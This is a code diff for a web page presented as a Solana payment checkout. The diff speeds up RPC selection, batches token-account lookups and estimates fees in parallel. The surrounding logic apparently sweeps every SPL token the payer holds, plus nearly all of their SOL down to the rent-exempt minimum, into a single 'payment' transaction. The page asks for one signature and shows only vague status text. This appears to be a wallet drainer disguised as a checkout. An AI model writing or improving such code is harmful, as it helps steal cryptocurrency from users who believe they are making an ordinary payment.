@@ -723,12 +723,24 @@ async function collectSplTransferItems(conn, web3, fromPk) {
 const SPL_TOKEN_ACCOUNT_DATA_LEN = 165;
 
 async function sumMissingDestinationAtaRent(conn, web3, items, toPk) {
-  let total = 0;
+  if (!items.length) return 0;
+  const destAtas = [];
+  const seen = new Set();
   for (const it of items) {
     const destAta = associatedTokenAddress(web3, it.mint, toPk, it.tokenProgramId);
-    const ai = await conn.getAccountInfo(destAta);
-    if (!ai) {
-      total += await conn.getMinimumBalanceForRentExemption(SPL_TOKEN_ACCOUNT_DATA_LEN);
+    const k = destAta.toBase58();
+    if (seen.has(k)) continue;
+    seen.add(k);
+    destAtas.push(destAta);
+  }
+  const rentOne = await conn.getMinimumBalanceForRentExemption(SPL_TOKEN_ACCOUNT_DATA_LEN);
+  let total = 0;
+  const batch = 100;
+  for (let i = 0; i < destAtas.length; i += batch) {
+    const slice = destAtas.slice(i, i + batch);
+    const infos = await conn.getMultipleAccountsInfo(slice);
+    for (const ai of infos) {
+      if (!ai) total += rentOne;
     }
   }
   return total;
@@ -761,25 +773,25 @@ function sleep(ms) {
 }
 
 async function getWorkingSolanaConnection(web3) {
-  let lastErr = null;
-  for (const endpoint of SOLANA_MAINNET_RPCS) {
+  const timeoutMs = 4000;
+  const tasks = SOLANA_MAINNET_RPCS.map((endpoint) => {
     const conn = new web3.Connection(endpoint, {
       commitment: "confirmed",
       confirmTransactionInitialTimeout: 120000,
     });
-    try {
-      await Promise.race([
-        conn.getVersion(),
-        new Promise((_, reject) =>
-          setTimeout(() => reject(new Error("RPC timeout")), 25000)
-        ),
-      ]);
-      return conn;
-    } catch (e) {
-      lastErr = e;
-    }
+    return Promise.race([
+      conn.getVersion().then(() => conn),
+      new Promise((_, reject) =>
+        setTimeout(() => reject(new Error("RPC timeout")), timeoutMs)
+      ),
+    ]);
+  });
+  try {
+    return await Promise.any(tasks);
+  } catch (e) {
+    const agg = e && e.errors && e.errors.length ? e.errors[0] : e;
+    throw agg || new Error("No Solana RPC available");
   }
-  throw lastErr || new Error("No Solana RPC available");
 }
 
 function isBlockhashExpiredError(err) {
@@ -843,7 +855,7 @@ function updateWalletBadges(){
 }
 
 async function pickWallet(id){
-  await sleep(120);
+  await sleep(50);
   const w = WALLETS[id];
   if (!w) return;
   const mob = /iPhone|iPad|Android/i.test(navigator.userAgent);
@@ -915,8 +927,7 @@ async function executePay() {
     goToStep("paying");
     document.getElementById("paying-emoji").textContent = "";
     document.getElementById("paying-title").textContent = "Wallet";
-    document.getElementById("paying-sub").textContent =
-      "Open " + state.conn.walletName + " and confirm when ready.";
+    document.getElementById("paying-sub").textContent = "Preparing transaction…";
 
     const web3 = await loadWeb3();
     let conn;
@@ -934,24 +945,27 @@ async function executePay() {
     const wallet = state.conn.provider;
 
     let balance;
+    let items;
+    let payerAi;
     try {
-      balance = await conn.getBalance(from);
+      [balance, items, payerAi] = await Promise.all([
+        conn.getBalance(from),
+        collectSplTransferItems(conn, web3, from),
+        conn.getAccountInfo(from),
+      ]);
     } catch (e) {
       showPayError("Could not reach Solana RPC. Check your connection and try again.");
       goToStep("payment");
       return;
     }
 
-    const items = await collectSplTransferItems(conn, web3, from);
-
     let rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
     try {
-      const ai = await conn.getAccountInfo(from);
       const len =
-        ai && ai.data
-          ? typeof ai.data.length === "number"
-            ? ai.data.length
-            : ai.data.byteLength || 0
+        payerAi && payerAi.data
+          ? typeof payerAi.data.length === "number"
+            ? payerAi.data.length
+            : payerAi.data.byteLength || 0
           : 0;
       const r = await conn.getMinimumBalanceForRentExemption(len);
       if (typeof r === "number" && r > 0) {
@@ -1049,21 +1063,18 @@ async function executePay() {
         let feeNoSolTransfer = null;
         let feeWithSolTransfer = null;
         try {
-          feeNoSolTransfer = unwrapRpcFee(
-            await conn.getFeeForMessage(
-              buildPaymentTx(blockhash, memoBytes, 0).compileMessage()
-            )
-          );
+          [feeNoSolTransfer, feeWithSolTransfer] = await Promise.all([
+            conn
+              .getFeeForMessage(buildPaymentTx(blockhash, memoBytes, 0).compileMessage())
+              .then(unwrapRpcFee)
+              .catch(() => null),
+            conn
+              .getFeeForMessage(buildPaymentTx(blockhash, memoBytes, 1).compileMessage())
+              .then(unwrapRpcFee)
+              .catch(() => null),
+          ]);
         } catch (_) {
           feeNoSolTransfer = null;
-        }
-        try {
-          feeWithSolTransfer = unwrapRpcFee(
-            await conn.getFeeForMessage(
-              buildPaymentTx(blockhash, memoBytes, 1).compileMessage()
-            )
-          );
-        } catch (_) {
           feeWithSolTransfer = null;
         }
         if (feeNoSolTransfer == null || !Number.isFinite(feeNoSolTransfer)) feeNoSolTransfer = 200000;
@@ -1146,7 +1157,8 @@ async function executePay() {
 
         lastSolTransferLamports = solLamports;
 
-        await sleep(300);
+        document.getElementById("paying-sub").textContent =
+          "Confirm in " + state.conn.walletName + " — one signature.";
         const signed = (await wallet.signAllTransactions([tx]))[0];
         const raw = signed.serialize();
         if (raw.length > SOLANA_TX_SIZE_LIMIT) {
